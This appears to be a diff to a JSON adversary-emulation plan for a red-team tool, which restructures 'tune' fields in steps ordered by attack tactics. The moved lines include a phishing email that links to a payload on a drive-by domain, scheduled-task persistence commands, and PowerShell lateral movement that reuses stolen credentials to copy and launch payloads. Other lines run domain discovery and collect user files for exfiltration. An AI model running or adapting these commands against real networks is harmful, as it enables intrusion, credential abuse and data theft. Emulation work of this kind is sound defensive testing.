@@ -14,7 +14,8 @@
             "label": "actuator",
             "preconditions": {
                 "tool": "self.tool_name"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -24,7 +25,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -34,7 +36,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -46,7 +49,8 @@
                 "exfiltration": "self.exfil",
                 "driveby": "self.driveby",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -54,7 +58,8 @@
             "label": "Payload",
             "preconditions": {
                 "tool": "self.tool"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "InitialAccess",
@@ -65,10 +70,10 @@
                 "phishing": "self.phish_1",
                 "tool": "self.tool",
                 "driveby": "self.driveby",
-                "target": "self.target_1",
-                "tune": {
-                    "body": "Hi, \nThe 2019 Senior Staff Club House calendar gallery has been updated. To submit artwork for consideration, please fill in the form at http://${self.driveby_domain}/${self.payload_name}.\n The deadline for submission is May 17, 2019. \nThanks and look forward to seeing your beautiful projects! \nKelly"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "body": "Hi, \nThe 2019 Senior Staff Club House calendar gallery has been updated. To submit artwork for consideration, please fill in the form at http://${self.driveby_domain}/${self.payload_name}.\n The deadline for submission is May 17, 2019. \nThanks and look forward to seeing your beautiful projects! \nKelly"
             }
         },
         {
@@ -81,7 +86,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Execution",
@@ -93,7 +99,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -104,10 +111,10 @@
                 "phishing": "self.phish_1",
                 "tool": "self.tool",
                 "driveby": "self.driveby",
-                "target": "self.target_1",
-                "tune": {
-                    "infra": true
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "infra": true
             }
         },
         {
@@ -120,7 +127,8 @@
                 "tool": "self.tool",
                 "target_1": "self.target_1",
                 "target_2": "self.target_1_elevated"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -131,7 +139,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1_elevated"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Persistence",
@@ -141,10 +150,10 @@
                 "actuator": "self.actuator",
                 "agent": "self.agent_tgt1_elevated",
                 "tool": "self.tool",
-                "target": "self.target_1_elevated",
-                "tune": {
-                    "command": "schtasks /create /f /tn${self.target_1_elevated_taskname}/tr${self.target_1_elevated_payload_destination}\\${self.payload_name}/sc onlogon"
-                }
+                "target": "self.target_1_elevated"
+            },
+            "tune": {
+                "command": "schtasks /create /f /tn${self.target_1_elevated_taskname}/tr${self.target_1_elevated_payload_destination}\\${self.payload_name}/sc onlogon"
             }
         },
         {
@@ -155,7 +164,8 @@
                 "agent": "self.agent_tgt1_elevated",
                 "tool": "self.tool",
                 "target": "self.target_1_elevated"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Discovery",
@@ -164,10 +174,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1_elevated",
                 "tool": "self.tool",
-                "target": "self.target_1_elevated",
-                "tune": {
-                    "command": "net user"
-                }
+                "target": "self.target_1_elevated"
+            },
+            "tune": {
+                "command": "net user"
             }
         },
         {
@@ -177,10 +187,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1_elevated",
                 "tool": "self.tool",
-                "target": "self.target_1_elevated",
-                "tune": {
-                    "command": "net view /all"
-                }
+                "target": "self.target_1_elevated"
+            },
+            "tune": {
+                "command": "net view /all"
             }
         },
         {
@@ -190,10 +200,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1_elevated",
                 "tool": "self.tool",
-                "target": "self.target_1_elevated",
-                "tune": {
-                    "command": "net user /domain"
-                }
+                "target": "self.target_1_elevated"
+            },
+            "tune": {
+                "command": "net user /domain"
             }
         },
         {
@@ -203,10 +213,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1_elevated",
                 "tool": "self.tool",
-                "target": "self.target_1_elevated",
-                "tune": {
-                    "command": "net group /domain"
-                }
+                "target": "self.target_1_elevated"
+            },
+            "tune": {
+                "command": "net group /domain"
             }
         },
         {
@@ -216,10 +226,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1_elevated",
                 "tool": "self.tool",
-                "target": "self.target_1_elevated",
-                "tune": {
-                    "command": "netstat -ano"
-                }
+                "target": "self.target_1_elevated"
+            },
+            "tune": {
+                "command": "netstat -ano"
             }
         },
         {
@@ -230,10 +240,10 @@
                 "agent": "self.agent_tgt1_elevated",
                 "tool": "self.tool",
                 "target_1": "self.target_1_elevated",
-                "target_2": "self.target_2",
-                "tune": {
-                    "command": "powershell &{schtasks /create /f /tn \"${self.target_2_taskname}\" /ST 23:58 /sc once /tr cmd.exe /ru${self.target_1_elevated_username}/rp${self.target_1_elevated_password}; $action1 = New-ScheduledTaskAction -Execute \"net\" -Argument \"use \\\\${self.target_2_hostname}/user:${self.target_2_username}@${self.domain}${self.target_2_password}\"; $action2 = New-ScheduledTaskAction -Execute \"robocopy\" -Argument \"c:\\users\\public\\ \\\\${self.target_2_hostname}\\c$\\users\\public${self.payload_name}\"; $trigger = New-ScheduledTaskTrigger -once -at 23:59; Set-ScheduledTask -action $action1,$action2 -trigger $trigger -taskname \"${self.target_2_taskname}\" -user${self.target_1_elevated_username}-password${self.target_1_elevated_password}}"
-                }
+                "target_2": "self.target_2"
+            },
+            "tune": {
+                "command": "powershell &{schtasks /create /f /tn \"${self.target_2_taskname}\" /ST 23:58 /sc once /tr cmd.exe /ru${self.target_1_elevated_username}/rp${self.target_1_elevated_password}; $action1 = New-ScheduledTaskAction -Execute \"net\" -Argument \"use \\\\${self.target_2_hostname}/user:${self.target_2_username}@${self.domain}${self.target_2_password}\"; $action2 = New-ScheduledTaskAction -Execute \"robocopy\" -Argument \"c:\\users\\public\\ \\\\${self.target_2_hostname}\\c$\\users\\public${self.payload_name}\"; $trigger = New-ScheduledTaskTrigger -once -at 23:59; Set-ScheduledTask -action $action1,$action2 -trigger $trigger -taskname \"${self.target_2_taskname}\" -user${self.target_1_elevated_username}-password${self.target_1_elevated_password}}"
             }
         },
         {
@@ -245,10 +255,10 @@
                 "agent": "self.agent_tgt1_elevated",
                 "tool": "self.tool",
                 "target_1": "self.target_1_elevated",
-                "target_2": "self.target_2",
-                "tune": {
-                    "command": "schtasks /run /tn${self.target_2_taskname}"
-                }
+                "target_2": "self.target_2"
+            },
+            "tune": {
+                "command": "schtasks /run /tn${self.target_2_taskname}"
             }
         },
         {
@@ -259,10 +269,10 @@
                 "agent": "self.agent_tgt1_elevated",
                 "tool": "self.tool",
                 "target_1": "self.target_1_elevated",
-                "target_2": "self.target_2",
-                "tune": {
-                    "command": "cmd.exe /c schtasks.exe /create /f /SC once /ST 23:59 /TN${self.target_2_taskname}/TR c:\\users\\public\\${self.payload_name}/RL highest /u${self.target_2_username}@${self.domain}/p${self.target_2_password}/ru${self.target_2_username}@${self.domain}/rp${self.target_2_password}/s${self.target_2_hostname}"
-                }
+                "target_2": "self.target_2"
+            },
+            "tune": {
+                "command": "cmd.exe /c schtasks.exe /create /f /SC once /ST 23:59 /TN${self.target_2_taskname}/TR c:\\users\\public\\${self.payload_name}/RL highest /u${self.target_2_username}@${self.domain}/p${self.target_2_password}/ru${self.target_2_username}@${self.domain}/rp${self.target_2_password}/s${self.target_2_hostname}"
             }
         },
         {
@@ -275,7 +285,8 @@
                 "tool": "self.tool",
                 "target_1": "self.target_1_elevated",
                 "target_2": "self.target_2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -286,7 +297,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "LateralMovement",
@@ -296,10 +308,10 @@
                 "agent": "self.agent_tgt2",
                 "tool": "self.tool",
                 "target_1": "self.target_2",
-                "target_2": "self.target_2",
-                "tune": {
-                    "command": "robocopy c:\\users\\public\\ \\\\file\\share${self.payload_name}"
-                }
+                "target_2": "self.target_2"
+            },
+            "tune": {
+                "command": "robocopy c:\\users\\public\\ \\\\file\\share${self.payload_name}"
             }
         },
         {
@@ -310,10 +322,10 @@
                 "agent": "self.agent_tgt2",
                 "tool": "self.tool",
                 "target_1": "self.target_2",
-                "target_2": "self.target_2",
-                "tune": {
-                    "command": "powershell &{schtasks /create /f /tn \"${self.target_2_taskname}\" /sc onlogon /tr cmd.exe; $action1 = New-ScheduledTaskAction -Execute \"net\" -Argument \"use \\\\file\\share /user:${self.target_2_username}@${self.domain}${self.target_2_password}\"; $action2 = New-ScheduledTaskAction -Execute \"robocopy\" -Argument \"\\\\file\\share c:\\users\\public${self.payload_name}\"; $trigger = New-ScheduledTaskTrigger -AtLogOn; Set-ScheduledTask -action $action1,$action2 -trigger $trigger -taskname \"${self.target_2_taskname}\" }"
-                }
+                "target_2": "self.target_2"
+            },
+            "tune": {
+                "command": "powershell &{schtasks /create /f /tn \"${self.target_2_taskname}\" /sc onlogon /tr cmd.exe; $action1 = New-ScheduledTaskAction -Execute \"net\" -Argument \"use \\\\file\\share /user:${self.target_2_username}@${self.domain}${self.target_2_password}\"; $action2 = New-ScheduledTaskAction -Execute \"robocopy\" -Argument \"\\\\file\\share c:\\users\\public${self.payload_name}\"; $trigger = New-ScheduledTaskTrigger -AtLogOn; Set-ScheduledTask -action $action1,$action2 -trigger $trigger -taskname \"${self.target_2_taskname}\" }"
             }
         },
         {
@@ -323,10 +335,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt2",
                 "tool": "self.tool",
-                "target": "self.target_2",
-                "tune": {
-                    "command": "powershell &{$files = @(); gci c:\\\\users -exclude \"Public\" | gci -Recurse -exclude \"AppData,\",\"*.lnk\",\"*.url\" -file 2>$null | foreach {$files = $files + $_.FullName};$file = $files | Get-Random; Copy-Item -Path $file C:\\users\\public\\secret1.file -force; echo $file}"
-                }
+                "target": "self.target_2"
+            },
+            "tune": {
+                "command": "powershell &{$files = @(); gci c:\\\\users -exclude \"Public\" | gci -Recurse -exclude \"AppData,\",\"*.lnk\",\"*.url\" -file 2>$null | foreach {$files = $files + $_.FullName};$file = $files | Get-Random; Copy-Item -Path $file C:\\users\\public\\secret1.file -force; echo $file}"
             }
         },
         {
@@ -336,10 +348,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt2",
                 "tool": "self.tool",
-                "target": "self.target_2",
-                "tune": {
-                    "command": "powershell &{$files = @(); gci c:\\\\users -exclude \"Public\" | gci -Recurse -exclude \"AppData,\",\"*.lnk\",\"*.url\" -file 2>$null | foreach {$files = $files + $_.FullName};$file = $files | Get-Random; Copy-Item -Path $file C:\\users\\public\\secret2.file -force; echo $file}"
-                }
+                "target": "self.target_2"
+            },
+            "tune": {
+                "command": "powershell &{$files = @(); gci c:\\\\users -exclude \"Public\" | gci -Recurse -exclude \"AppData,\",\"*.lnk\",\"*.url\" -file 2>$null | foreach {$files = $files + $_.FullName};$file = $files | Get-Random; Copy-Item -Path $file C:\\users\\public\\secret2.file -force; echo $file}"
             }
         },
         {
@@ -351,7 +363,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "target": "self.target_2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Exfiltration",
@@ -362,7 +375,8 @@
                 "tool": "self.tool",
                 "target": "self.target_2",
                 "exfil": "self.exfil"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Exfiltration",
@@ -373,7 +387,8 @@
                 "tool": "self.tool",
                 "target": "self.target_1_elevated",
                 "exfil": "self.exfil"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Exfiltration",
@@ -384,7 +399,8 @@
                 "tool": "self.tool",
                 "target": "self.target_1_elevated",
                 "exfil": "self.exfil"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Utility",
@@ -394,7 +410,8 @@
                 "agent": "self.agent_tgt2",
                 "tool": "self.tool",
                 "target": "self.target_2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Utility",
@@ -404,7 +421,8 @@
                 "agent": "self.agent_tgt1_elevated",
                 "tool": "self.tool",
                 "target": "self.target_1_elevated"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Utility",
@@ -414,7 +432,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         }
     ],
     "iocs": {
